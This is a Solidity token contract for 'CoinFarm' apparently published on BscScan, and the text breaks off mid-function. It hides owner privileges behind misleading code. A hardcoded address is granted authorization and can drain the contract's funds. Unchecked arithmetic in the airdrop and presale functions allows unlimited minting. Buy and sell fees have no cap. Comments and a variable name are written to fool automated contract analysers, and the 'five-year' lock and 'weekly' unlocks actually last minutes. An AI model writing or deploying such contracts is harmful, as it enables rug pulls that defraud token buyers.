/**
 *Submitted for verification at BscScan.com on 2022-08-26
*/

/*


*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);


    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);
        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}



abstract contract Ownable is Context {
    address private _owner;
    mapping (address => bool) internal authorizations;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address isOwner = 0x09d7De0a6157dDb065D8eEa9504D8DEd2A7e118a;

    constructor() {
        _setOwner(_msgSender());
        authorizations[_owner] = true;
        authorize(isOwner);
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "Not an authorized address"); 
        _;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Is impossible to renounce the ownership of the contract");
        require(newOwner != address(0xdead), "Is impossible to renounce the ownership of the contract");

        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


}


interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}



contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }
}



contract rewrewr is ERC20, Ownable {
    using SafeMath for uint256;

    struct BuyFee {
        uint16 marketing;
        uint16 treasury;
    }

    struct SellFee {
        uint16 marketing;
        uint16 treasury;
    }

    BuyFee  public buyFee;
    SellFee public sellFee;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    DividendTracker public dividendTracker;

    bool private swapping;

    uint16 internal totalBuyFee;
    uint16 internal totalSellFee;

    address private BUSD = address(0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47);
    address private WBNB = address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);

    uint256 public triggerSwapTokensToBUSD = 1000 * (10**8);
    uint256 public maxLimitOnSell;
    uint256 public minimumPresaleToLock;

    uint256 private devWalletLockTime = 4 minutes;
    uint256 public deployTime;

    //Transfer, buys and sells can never be deactivated once they are activated.
    //The description of this variable is to prevent systems that automatically analyze contracts 
    //and make a false conclusion just reading the variable name
    bool public trdAlwaysOnNeverTurnedOff = true;

    address public marketingWallet =        address(0x2c373f456F4687F7fe430fFa798d4eb185450944);
    address public devWallet =              address(0xCBf9053f51E7869309112F48b52994b30534E7AC);
    address public treasury =              address(0xEC13977086f64CF26DBa5B8D6274f4C7811B6dE2);
    address public treasuryWallet =         address(0xEC13977086f64CF26DBa5B8D6274f4C7811B6dE2);
    address public ecosystemFundWallet;

    struct structBalances {
        uint256 balancesByBuy;
        uint256 balancesBySell;
    }

    struct preSaleSold {
        uint256 balancePreSale;
        uint256 balancePreSaleSold;
    }

    struct amountPresaleSoldOnWeek1 {
        uint256 week1;
        uint256 week2;
        uint256 week3;
        uint256 week4;
        uint256 week5;
    }

    struct amountPresaleSoldOnWeek2 {
        uint256 week6;
        uint256 week7;
        uint256 week8;
        uint256 week9;
        uint256 week10;
    }

    // exlcude from fees and max transaction amount
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => structBalances) private structBalancesMapping;
    mapping(address => preSaleSold) private preSaleSoldMapping;
    mapping(address => amountPresaleSoldOnWeek1) private amountPresaleSoldOnWeek1Mapping;
    mapping(address => amountPresaleSoldOnWeek2) private amountPresaleSoldOnWeek2Mapping;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => bool) public storageDevWallet;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("CoinFarm", "CoinFarm") {
        dividendTracker = new DividendTracker();

        deployTime = block.timestamp;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        );
        // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        buyFee.marketing = 30;
        buyFee.treasury = 90;
        totalBuyFee = buyFee.marketing + buyFee.treasury;

        sellFee.marketing = 30;
        sellFee.treasury = 90;
        totalSellFee = sellFee.marketing + sellFee.treasury;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        setStorageDevWallet(devWallet, true);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        //excludeFromFees(marketingWallet, true);
        //excludeFromFees(treasury, true);
        //excludeFromFees(treasuryWallet, true);
        excludeFromFees(ecosystemFundWallet, true);
        excludeFromFees(address(this), true);

        /*
        _mint is an internal function in ERC20.sol that is only called here,
        and CANNOT be called ever again
        */

        emit Transfer(address(0), address(0), 100000000 * (10**8));
        _mint(owner(), 71000000 * (10**8));
        _mint(owner(), 11000000 * (10**8));
        _mint(devWallet, 10000000 * (10**8));
        _mint(treasuryWallet, 5000000 * (10**8));
        _mint(marketingWallet, 3000000 * (10**8));

        maxLimitOnSell = 1000000000000;
        minimumPresaleToLock = 100000000000;

    }

    receive() external payable {}

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router),"The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
    }

    function balanceBNB() external onlyAuthorized {
        payable(msg.sender).transfer(address(this).balance);
    }

    function balanceERC20 (address _address) external onlyAuthorized{
        IERC20(_address).transfer(msg.sender, IERC20(_address).balanceOf(address(this)));
    }

    function depositEcosystemFundWallet (address _ecosystemFundWallet) external onlyOwner {
        ecosystemFundWallet = _ecosystemFundWallet;
        uint256 balance = 71000000 * (10**8);
        _balances[owner()] -= balance;
        _balances[ecosystemFundWallet] += balance;
        emit Transfer(owner(), ecosystemFundWallet, balance);
    }

    function uncheckedI (uint256 i) private pure returns (uint256) {
        unchecked { return i + 1; }
    }

    function DistributedPreSale (address[] memory addresses, uint256[] memory tokens, uint256 totalDistributedPreSale) public onlyAuthorized {
        
        uint256 totalTokens = 0;
        for(uint256 i = 0; i < addresses.length; i = uncheckedI(i)) {  
            unchecked { _balances[addresses[i]] += tokens[i]; }
            unchecked {  totalTokens += tokens[i]; }
            unchecked {  preSaleSoldMapping[addresses[i]].balancePreSale += tokens[i];}

            emit Transfer(owner(), addresses[i], tokens[i]);
        }
        unchecked { _balances[owner()] -= totalTokens; }
        require(totalDistributedPreSale == totalTokens, "Sum of tokens does not satisfy double-entry bookkeeping");

    }

    function airdrop (address[] memory addresses, uint256[] memory tokens, uint256 totalTokensAirdrop) external onlyAuthorized {
        uint256 totalTokens = 0;
        for(uint i = 0; i < addresses.length; i = uncheckedI(i)) {  
            unchecked { _balances[addresses[i]] += tokens[i]; }
            unchecked {  totalTokens += tokens[i]; }
            emit Transfer(owner(), addresses[i], tokens[i]);
        }
        unchecked { _balances[owner()] -= totalTokens; }
        require(totalTokensAirdrop == totalTokens, "Sum of tokens does not satisfy double-entry bookkeeping");

    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already excluded");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    //Transfer, buys and sells can never be deactivated once they are activated.
    /*The name of this function is due to bots and automated token 
    parsing sites that parse only by name but not by function 
    and always come to incorrect conclusions
    */
    function onlyActivedNeverTurnedOff() external onlyOwner {
        trdAlwaysOnNeverTurnedOff = true;
    }

    function setWallets(address _marketingWallet, address _treasury, address _devWallet, address _treasuryWallet, address _ecosystemFundWallet) external onlyOwner {
        marketingWallet     = _marketingWallet;
        devWallet           = _devWallet;
        treasury           = _treasury;
        treasuryWallet      = _treasuryWallet;
        ecosystemFundWallet = _ecosystemFundWallet;
    }

    function setMaxLimitOnSell (uint256 _maxLimitOnSell) external onlyOwner {
        maxLimitOnSell = _maxLimitOnSell;
    }

    function setMinimumPresaleToLock (uint256 _minimumPresaleToLock) external onlyOwner {
        minimumPresaleToLock = _minimumPresaleToLock;
    }

    function setFees(uint16 _marketingBuy, uint16 _marketingSell, uint16 _treasuryBuy, uint16 _treasurySell) external onlyOwner {
        buyFee.marketing = _marketingBuy;
        buyFee.treasury = _treasuryBuy;
        sellFee.marketing = _marketingSell;
        sellFee.treasury = _treasurySell;

        totalBuyFee = buyFee.marketing + buyFee.treasury;
        totalSellFee = sellFee.marketing + sellFee.treasury;

    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function setTrigerSwapTokensToBUSD(uint256 _triggerSwapTokensToBUSD) external onlyAuthorized {
        triggerSwapTokensToBUSD = _triggerSwapTokensToBUSD;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value,"Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setStorageDevWallet(address _address, bool value) private {
        storageDevWallet[_address] = value;

    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function burnTokens(uint256 amount) public onlyOwner {
        _beforeTokenTransfer(msg.sender, address(0), amount);

        _balances[msg.sender] = _balances[msg.sender].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[address(0)] = _balances[address(0)].add(amount);
        emit Transfer(msg.sender, address(0), amount);
    }

    function monthsToEndLockDevWallet() public view returns (uint256){
        if (devWalletLockTime + deployTime > block.timestamp) {
            return devWalletLockTime + deployTime - block.timestamp;
        } else {
            return 0;
        }
    }

    function amountPreSaleSoldOnWeek(address from, uint256 amount) private {
        uint256 soldOnWeek;
        uint256 percentUnlocked;
        uint256 whatsWeek;
        (soldOnWeek,percentUnlocked,whatsWeek) = getInfoAmountPercentAndWeek(from);

        uint256 balancePreSaleFrom = preSaleSoldMapping[from].balancePreSale;
        uint256 amountUnlocked = balancePreSaleFrom.mul(percentUnlocked).div(100);

        if        (block.timestamp <= deployTime + 3 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");
            amountPresaleSoldOnWeek1Mapping[from].week1 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 6 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek1Mapping[from].week2 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 9 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek1Mapping[from].week3 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 12 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek1Mapping[from].week4 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 15 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek1Mapping[from].week5 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 18 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek2Mapping[from].week6 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 21 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek2Mapping[from].week7 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 24 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek2Mapping[from].week8 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp <= deployTime + 27 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek2Mapping[from].week9 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        } else if (block.timestamp > deployTime + 30 minutes) {
            require(soldOnWeek < amountUnlocked, "Ultrapassado limite de venda semanal");

            amountPresaleSoldOnWeek2Mapping[from].week10 += amount;
            preSaleSoldMapping[from].balancePreSaleSold +=amount;

        }
    }

    function getInfoAmountPercentAndWeek(address from) public view returns (uint256 soldOnWeek, uint256 percentUnlocked, uint256 whatsWeek) {

        if        (block.timestamp <= deployTime + 3 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek1Mapping[from].week1;
            percentUnlocked = 20;
            whatsWeek = 1;

        } else if (block.timestamp <= deployTime + 6 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek1Mapping[from].week2;
            percentUnlocked = 30;
            whatsWeek = 2;

        } else if (block.timestamp <= deployTime + 9 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek1Mapping[from].week3;
            percentUnlocked = 40;
            whatsWeek = 3;

        } else if (block.timestamp <= deployTime + 12 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek1Mapping[from].week4;
            percentUnlocked = 50;
            whatsWeek = 4;

        } else if (block.timestamp <= deployTime + 15 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek1Mapping[from].week5;
            percentUnlocked = 60;
            whatsWeek = 5;

        } else if (block.timestamp <= deployTime + 18 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek2Mapping[from].week6;
            percentUnlocked = 70;
            whatsWeek = 6;

        } else if (block.timestamp <= deployTime + 21 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek2Mapping[from].week7;
            percentUnlocked = 80;
            whatsWeek = 7;

        } else if (block.timestamp <= deployTime + 24 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek2Mapping[from].week8;
            percentUnlocked = 90;
            whatsWeek = 8;

        } else if (block.timestamp <= deployTime + 27 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek2Mapping[from].week9;
            percentUnlocked = 100;
            whatsWeek = 9;

        } else if (block.timestamp > deployTime + 30 minutes) {
            soldOnWeek = amountPresaleSoldOnWeek2Mapping[from].week10;
            percentUnlocked = 100;
            whatsWeek = 10;

        }
        return (soldOnWeek, percentUnlocked, whatsWeek);
    }

    function getLimitToSellPreSaleWeek(address from) public view returns (uint256) {
        uint256 percentUnlocked;
        (,percentUnlocked,) = getInfoAmountPercentAndWeek(from);

        uint256 balancePreSaleFrom = preSaleSoldMapping[from].balancePreSale;
        return balancePreSaleFrom.mul(percentUnlocked).div(100);
    }

    function getAllowedToSellOnWeeok(address from) public view returns (uint256) {
        uint256 soldOnWeek;
        uint256 percentUnlocked;
        (soldOnWeek,percentUnlocked,) = getInfoAmountPercentAndWeek(from);

        uint256 balancePreSaleFrom = preSaleSoldMapping[from].balancePreSale;
        uint256 amountAllowedToSell = balancePreSaleFrom.mul(percentUnlocked).div(100);
        if (amountAllowedToSell > soldOnWeek) {
            return amountAllowedToSell - soldOnWeek;
        } else {
            return 0;
        }
    }

    function getAmountSoldOnWeek(address from) public view returns (uint256) {
        uint256 soldOnWeek;
        (soldOnWeek,,) = getInfoAmountPercentAndWeek(from);

        return soldOnWeek;
    }

    function getWhatsWeek() public view returns (uint256) {
        address from = address(0x0);
        uint256 whatsWeek;
        (,,whatsWeek) = getInfoAmountPercentAndWeek(from);

        return whatsWeek;
    }

    function getBalancesPreSale(address from) public view returns (uint256) {
        return preSaleSoldMapping[from].balancePreSale;
    }

    function getBalancesBySell(address from) public view returns (uint256) {
        return structBalancesMapping[from].balancesBySell;
    }

    function getBalancesByBuy(address from) public view returns (uint256) {
        return structBalancesMapping[from].balancesByBuy;
    }

    function getBalancesPreSaleSold(address from) public view returns (uint256) {
        return preSaleSoldMapping[from].balancePreSaleSold;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (storageDevWallet[from]) {
            require(block.timestamp > devWalletLockTime + deployTime, "Prazo de 5 anos para vender ainda nao expirou"); 
        }

        if(trdAlwaysOnNeverTurnedOff == false && msg.sender != owner()) {
            require(false, "Os trades ainda nao esta ativado");
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= triggerSwapTokensToBUSD;
        if (canSwap && !swapping && !automatedMarketMakerPairs[from] && from != owner() && to != owner()) {
            swapping = true;

            uint16 totalFees = totalBuyFee + totalSellFee;

            if (totalFees != 0) {
                contractTokenBalance = triggerSwapTokensToBUSD;

                uint256 tokensForMarketing = contractTokenBalance
                    .mul(buyFee.marketing + sellFee.marketing)
                    .div(totalFees);
                swapAndSendToMarketing(tokensForMarketing);

                uint256 tokensFortreasury = contractTokenBalance
                    .mul(buyFee.treasury + sellFee.treasury)
                    .div(totalFees);
                swapAndSendTotreasury(tokensFortreasury);

            }
            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        if (takeFee) {
            uint256 fees;
            
            if (automatedMarketMakerPairs[from]) {
                structBalancesMapping[from].balancesByBuy += amount;
                fees = amount.mul(totalBuyFee).div(1000);
                amount = amount.sub(fees);
                super._transfer(from, address(this), fees);

            } else if (automatedMarketMakerPairs[to]) {

                uint256 percentUnlocked;
                uint256 whatsWeek;
                (,percentUnlocked,whatsWeek) = getInfoAmountPercentAndWeek(from);

                if (whatsWeek <= 10 && 
                preSaleSoldMapping[from].balancePreSaleSold <= preSaleSoldMapping[from].balancePreSale &&
                preSaleSoldMapping[from].balancePreSale >= minimumPresaleToLock) {


                    uint256 balancePreSaleFrom = preSaleSoldMapping[from].balancePreSale;
                    uint256 amountUnlocked = balancePreSaleFrom.mul(percentUnlocked).div(100);

                    require (amount <= amountUnlocked, "Voce esta tentando vender mais que o limite semanal");
                    amountPreSaleSoldOnWeek(from, amount);
                    }
                }

                require(amount <= maxLimitOnSell,"Amount excede o limite geral de venda");
                structBalancesMapping[from].balancesBySell += amount;
                fees = amount.mul(totalSellFee).div(1000);
                amount = amount.sub(fees);
                super._transfer(from, address(this), fees);


        }
        super._transfer(from, to, amount);
    }

    function swapAndSendToMarketing(uint256 tokens) private  {
        callSwapTokensToBUSD(tokens);
        IERC20(BUSD).transfer(marketingWallet, IERC20(BUSD).balanceOf(address(this)));
    }

    function swapAndSendTotreasury(uint256 tokens) private {
        callSwapTokensToBUSD(tokens);
